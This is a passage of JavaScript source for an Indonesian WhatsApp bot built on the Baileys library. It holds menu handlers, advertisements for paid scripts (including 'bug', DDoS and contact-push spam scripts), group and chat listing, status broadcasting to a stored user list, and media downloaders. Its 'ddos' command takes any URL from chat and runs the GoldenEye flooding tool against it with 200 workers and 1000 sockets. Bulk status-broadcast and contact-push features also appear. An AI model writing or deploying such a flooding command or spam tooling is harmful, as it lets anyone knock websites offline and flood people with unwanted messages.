if (!q) return reply(`*[ SCRIPT BY Zans Official ]*\n\n> MAU BELI SC NYA?\n>SC NYA GAK DI JUAL 😁\nTAPI KALO DI TAKE GANJA GAS\n\n- KEUNTUNGAN :\n> BISA PUSH KONTAK\n> BISA JPM + GAMBAR\n> JPM TANPA CAPE CUMA LEWAT BOT\n> BISA SAVE KONTAK LEWAT ID\n> BISA CREATE PANEL OTOMATIS\n> BISA BUY SC OTOMATIS\n> BISA ADDPM2\n> BISA DDOS\n> BISA SUBDO\n\n*MINAT? CHAT WA DI BAWAH*\n_wa.me/6283842671582_`)
break
case "panelprem": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY PANEL PREMIUM* )▭▬▭

*NEED PANEL PREM KAK ? PM OWNER DIBAWAH*

*NO OWNER : wa.me/6281802527761*
*PEMBAYARAN VIA :*
*-QRIS*
*-GOPAY*
*-BRI*

*LINK GRUP OWNER :*
https://chat.whatsapp.com/JItUqenAPmI1zjjLt8PiLf

*NOTE : SEANDAI NYA OWNER TIDAK MERESPON MOHON BERSABAR MUNGKIN OWNER KU SIBUK, TERIMAKASIH*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "buysc": case "cekharga": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUY SCRIPT* )▭▬▭

*Mau Buy Sc? Pilih Sc Dibawah Ini* :

*Sc Bug v1 15k*
*Sc Bug v2 25k*
*Sc Bug v3 35k*
*Sc Hw 19 20k*
*Sc Hw 19 Fitur Jpm 25k*
*Sc Hw 19 Fitur Jpm + Cpanel 30k*
*Sc Campuran v2 15k*
*Sc Campuran v3 25k*
*Sc Campuran v3 + Subdo 30k*
*Sc Campuran v4 35k*
*Sc Campuran v5 50k*
*Sc Campuran v6 60k*
*Sc Campuran v6 + Subdo 70k*
*Sc Campuran v7 + otp 75k*
*Sc Campuran v7 + addpm2 85k*
*Sc Cvps v1 50k*
*Sc Cvps v2 80k*
*Sc Jaga Grupv1 10k*
*Sc Jaga Grupv2 15k*
*Sc Pushkontak 10k*
*Sc PushAutoSave 15k*
*Sc Jpm X PushKntk v1 15k*
*Sc Jpm X PushKntk v2 20k*
*Sc Jpm X PushKntk v3 25k*
*Sc Themav1 10k*
*Sc Themav2 15k*
*Sc Nowa 20k*
*Sc Webp 10k*
*Sc Tesmoni 15k*
*Sc Ddos 20k*
*Sc Buka Enc 15k*
*Module 15k*
*Admin Panel 15k ( Garansi 7Day )*
*All Vps ( Pm Owner )*

*Usahakan Saldo Mu Mencukupi Ya Kak🙏*

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sewa": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SEWA BOT PANEL* )▭▬▭

Sewa Bot ? 
Hubungi *@${owned.split("@")[0]}* 
Untuk Nego Harga😁

▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sc": case "script": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SCRIPT* )▭▬▭

Mau Sc ? Buy Ke Dia *@${owned.split("@")[0]}*

© Cs Pedia Official
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "storemenu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STORE MENU* )▭▬▭

⭔ ${prefix}done
⭔ ${prefix}batal
⭔ ${prefix}tunda
⭔ ${prefix}proses
⭔ ${prefix}reqvps
⭔ ${prefix}reqpanel

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "linklog": { 
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LINK LOGIN PANEL* )▭▬▭

*LINK LOGIN :*
${domain}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/linklog.mp3')
DitzzXploit.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "ramlist": { 
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭▬▭( *SERVER V1* )▭▬▭▬▭

.1gb [username,nomor]
.2gb [username,nomor]
.3gb [username,nomor]
.4gb [username,nomor]
.5gb [username,nomor]
.6gb [username,nomor]
.7gb [username,nomor]
.8gb [username,nomor]
.unli [username,nomor]

▬▭▬▭▬▭▬▭▬▭▬▭▬

▭▬▭▬▭( *SERVER V2* )▭▬▭▬▭

.srv21gb [username,nomor]
.srv22gb [username,nomor]
.srv23gb [username,nomor]
.srv24gb [username,nomor]
.srv2unli [username,nomor]

▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
} freya = fs.readFileSync('./freya/ramlist.mp3')
DitzzXploit.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "tutorial": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *TUTOR RUN* )▭▬▭

*TUTOR RUN BOT*
( https://youtu.be/rqqxkI4P8YY )

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "sosmed": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOSMED OWNER* )▭▬▭

*INSTAGRAM OWNER :* 
${instagram}
*YOUTUBE OWNER :* 
${youtube}
*TELEGRAM OWNER :* 
${telegram}
*GROUP OWNER :* 
${grup}

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "pm2menu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*
*OTOMATIS SEMUA ASAL ADA SALDO*
SALDO ANDA : Rp : ${toRupiah(cekSaldo(sender, db_saldo))}
▭▬▭( *PM2 MENU* )▭▬▭

⭔ ${prefix}buycasepm2
⭔ ${prefix}buyeggpm2
⭔ ${prefix}buyapipm2
⭔ ${prefix}buyscpm2

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "stalkmenu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *STALK MENU* )▭▬▭

⭔ ${prefix}ffstalk

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "swmenu": {
const owned = `6281802527761@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SW MENU* )▭▬▭

⭔ ${prefix}buatswimage
⭔ ${prefix}buatswvideo
⭔ ${prefix}buatsw
⭔ ${prefix}swin
⭔ ${prefix}vnsw
⭔ ${prefix}inisw

*Note : Sisa Nya Masih Dalam Pengembangan.*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "downloadmenu": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOWNLOAD MENU* )▭▬▭

⭔ ${prefix}toaud
⭔ ${prefix}toimg
⭔ ${prefix}tomp4
⭔ ${prefix}ytmp3
⭔ ${prefix}ytmp4
⭔ ${prefix}ytsearch
⭔ ${prefix}smeme
⭔ ${prefix}remini
⭔ ${prefix}hd
⭔ ${prefix}tovn
⭔ ${prefix}togif
⭔ ${prefix}tourl
⭔ ${prefix}tiktok
⭔ ${prefix}tiktokaudio
⭔ ${prefix}mediafire

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "soundmenu": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *SOUND MENU* )▭▬▭

⭔ ${prefix}sound1
⭔ ${prefix}sound2
⭔ ${prefix}sound3
⭔ ${prefix}sound4
⭔ ${prefix}sound5
⭔ ${prefix}sound6
⭔ ${prefix}sound7
⭔ ${prefix}sound8
⭔ ${prefix}sound9
⭔ ${prefix}sound10

*SOUND SAMPAI 161 TUAN🙏*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "randommenu": {
const owned = `6283842671582@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RANDOM CECAN* )▭▬▭

⭔ ${prefix}randomcecan1
⭔ ${prefix}randomcecan2
⭔ ${prefix}randomcecan3
⭔ ${prefix}randomcecan4
⭔ ${prefix}randomcecan5
⭔ ${prefix}randomcecan6
⭔ ${prefix}randomcecan7
⭔ ${prefix}randomcecan8
⭔ ${prefix}randomcecan9
⭔ ${prefix}randomcecan10

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
DitzzXploit.sendMessage(from, { text: text12, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case "creategc":{
if (!isOwner) return reply(`Ngapain ? Khusus Zans Offcial Aja !!`)
if (!text) return reply("Nama groupnya Tuan?")
let cret = await DitzzXploit.groupCreate(text, [])
let response = await DitzzXploit.groupInviteCode(cret.id)
let teks = `\`\`\`「  CREATION GROUP MESSAGE  」\`\`\`

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB
▸ Link : https://chat.whatsapp.com/${response}
`
setTimeout(() => {
reply(teks) 
}, 7000)
setTimeout(() => {
DitzzXploit.groupParticipantsUpdate(cret.id, [m.sender], "promote")
}, 5000)
setTimeout(() => {
DitzzXploit.groupParticipantsUpdate(cret.id, [m.sender], "add")
}, 1000)
}
break
case 'domainmenu':
if (!isOwner) return reply(`Ngapain ? Domain Privasi, Hanya Bisa Oleh Owner zans Official`)
let msggg = generateWAMessageFromContent(m.from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: "*CLICK Hare Blog*"
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: "Yt : DitzzXploit"
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            title: `👋Hallo Kak *${pushname}*

▭▬▭( *LIST DOMAIN* )▭▬▭
`,
            subtitle: `p`,
            hasMediaAttachment: false
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellstore.com\",\"id\":\".domain1\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellstore.net\",\"id\":\".domain2\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellstore.icu\",\"id\":\".domain3\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellstore.xyz\",\"id\":\".domain4\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellstore.art\",\"id\":\".domain5\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panellkuu.com\",\"id\":\".domain6\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"jasa-panel.my.id\",\"id\":\".domain7\"}"
              },
 {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"didinsec.biz.id\",\"id\":\".domain8\"}"
              },
              {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"putraoffc.cfd\",\"id\":\".domain9\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"sellerpannel.my.id\",\"id\":\".domain10\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"pannelku.icu\",\"id\":\".domain11\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"pannelku.cfd\",\"id\":\".domain12\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"putraoffc.site\",\"id\":\".domain13\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"putraoffc.com\",\"id\":\".domain14\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"kangpannel.xyz\",\"id\":\".domain15\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"mypannelku.com\",\"id\":\".domain16\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"pannelmurah.xyz\",\"id\":\".domain17\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"storepannel.xyz\",\"id\":\".domain18\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"tokopannel.xyz\",\"id\":\".domain19\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"mypannel.cfd\",\"id\":\".domain20\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"adminpannel.xyz\",\"id\":\".domain21\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"mypannel.icu\",\"id\":\".domain22\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"tokocpannelmurah.xyz\",\"id\":\".domain23\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"panelprivv.xyz\",\"id\":\".domain45\"}"
              },
                            {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"plerkuda.my.id\",\"id\":\".domain46\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"Addgc\",\"id\":\".addgc\"}"
              },
                                          {
                "name": "quick_reply",
                "buttonParamsJson": "{\"display_text\":\"chaneldev\",\"id\":\".chanel\"}"
              },
           ],
          })
        })
    }
  }
}, {})

return DitzzXploit.relayMessage(m.key.remoteJid, msggg.message, {
  messageId: m.key.id
})
break
case "chanel":{
reply(`https://whatsapp.com/channel/0029VaZPLAJ9xVJdf7A73036

✌️Jangan Lupa Join ✌️`)
}
break

//batas menu
//domainmenu
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
Rafathar = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await DitzzXploit.sendMessage(m.chat, { audio: Rafathar, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'totalfitur':
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
reply(`Total Bot Features Are ${totalFitur()}`)
        break
case 'listpc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
                 for (let i of anulistp) {
                     let nama = store.messages[i].array[0].pushName
                     teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
                 }
                 DitzzXploit.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
                 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
                 for (let i of anulistg) {
                     let metadata = await DitzzXploit.groupMetadata(i)
                     teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
                 }
                 DitzzXploit.sendTextWithMentions(m.chat, teks, m)
             }
             break
		case 'ytsearch':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytsearch?apikey=${apikey}&query=${command}`)
				.then(({ data }) => {
					var text = ''
					for (var x of data.result) {
						text += `Title : ${x.title}\n`
						text += `Views : ${x.views}\n`
						text += `Published : ${x.published}\n`
						text += `Thumbnail : ${x.thumbnail}\n`
						text += `Link : https://www.youtube.com/watch?v=${x.videoId}\n\n`
					}
					reply(text)
				})
				.catch(console.error)
			break
		case 'ytmp3':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `❖ Title    : *${data.result.title}*\n`
					caption += `❖ Size     : *${data.result.size}*`
					DitzzXploit.sendMessage(from, { image: { url: data.result.thumbnail }, caption }).then(() => {
						DitzzXploit.sendMessage(from, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
		case 'ytmp4':
		if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
			if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/VDvFcn6icXo`)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					DitzzXploit.sendMessage(from, { video: { url: data.result }, mimetype: 'video/mp4', caption : `silahkan ketik tovn atau to audio untuk merubah nya menjadi audio / vn`})
					})
				.catch(console.error)
			break
case 'vnsw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var huy = fs.readFileSync(`./database/Audio/${text}.mp3`)
DitzzXploit.sendMessage('status@broadcast', {audio: huy, mimetype: 'audio/mp4', ptt:true},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break


case 'inisw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya yang ada di database listvn`)
var buu = fs.readFileSync(`./database/Audio/${text}.mp3`)
DitzzXploit.sendMessage('status@broadcast', {audio: buu, mimetype:'audio/mp4', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283842671582',
title: `ZansOfficial`,
sourceUrl: `https://wa.me/6283842671582`, 
thumbnail: thumb}}},{
backgroundColor: '#FF000000',
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "buatswvideo":{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas video Dengan Caption ${prefix + command}`
if (!/video/.test(mime)) throw `Balas video dengan caption *${prefix + command}*`
const media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
DitzzXploit.sendMessage('status@broadcast', { video: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'swin':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!text) return reply(`masukin text nya`)
DitzzXploit.sendMessage('status@broadcast', {
text: `${text}`
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: pengguna
});
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case "buatswimage":{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
 if (!quoted) throw `Balas image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Balas image dengan caption *${prefix + command}*`
const media = await DitzzXploit.downloadAndSaveMediaMessage(quoted)
DitzzXploit.sendMessage('status@broadcast', { image: { url: media }}, {statusJidList: pengguna})
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case  'addcase':{
if(!isOwnerr) return reply('khusus Zans') 
if(!text) return reply('mana case nya')
reply('kasus berhasil di tambahkan') 
}
break
case 'buatsw':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
let men = [];
for (let x of pengguna) {
men.push(x)
const result = [ x ]
if (!m.quoted && !text) throw 'reply pesan'
if (m.quoted && m.quoted.mtype === 'conversation' && !text) _m = DitzzXploit.sendMessage('status@broadcast', {
text: m.quoted.text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
if (!m.quoted && text) _m = DitzzXploit.sendMessage('status@broadcast', {
text,
}, {
backgroundColor: '#FF000000',
font: 3,
statusJidList: result
});
}
}
reply(`*Sukses mengirim status whatsapp ke ${pengguna.length} Orang Yang Ada Di database*`)
break
case 'ffstalk':{
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!q) return reply(`Example ${prefix+command} 946716486`)
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break
case 'ddos': {
    if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
    if (args.length < 1) return reply('Mohon masukkan link');

    const url = args[0];
    const options = `-w 200 -s 1000`;

    const pythonScript = `
import subprocess

command = "python3 goldeneye.py ${url} ${options}"
output = subprocess.getoutput(command)
print(output)
    `;

    const { writeFile, unlink } = require('fs');
    const { spawn } = require('child_process');

    const scriptPath = './goldeneye.py';
    writeFile(scriptPath, pythonScript, (err) => {
        if (err) {
            reply('Terjadi kesalahan saat menulis skrip Python.');
            return;
        }

        const process = spawn('python3', [scriptPath]);

        let output = '';
        let error = '';

        process.stdout.on('data', (data) => {
            output += data.toString();
        });

        process.stderr.on('data', (data) => {
            error += data.toString();
        });

        process.on('close', (code) => {
            unlink(scriptPath, () => {}); // Hapus skrip sementara setelah digunakan

            if (error) {
                reply('Terjadi kesalahan saat menjalankan skrip Python:\n' + error);
            } else {
                reply('Hasil:\n' + output);
            }
        });
    });
}
break
case 'toaud': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await DitzzXploit.downloadMediaMessage(quoted)
let { toAudio } = require('./freya/converter')
let audio = await toAudio(media, 'mp4')
DitzzXploit.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
}
break
case 'tovn': {
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
reply('*Sabar Cuy Loading*')
let media = await quoted.download()
let { toPTT } = require('./freya/converter')
let audio = await toPTT(media, 'mp4')
DitzzXploit.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: 'https://wa.me/6283842671582',
title: `Pedia Official`,
sourceUrl: `https://wa.me/6283842671582`, 
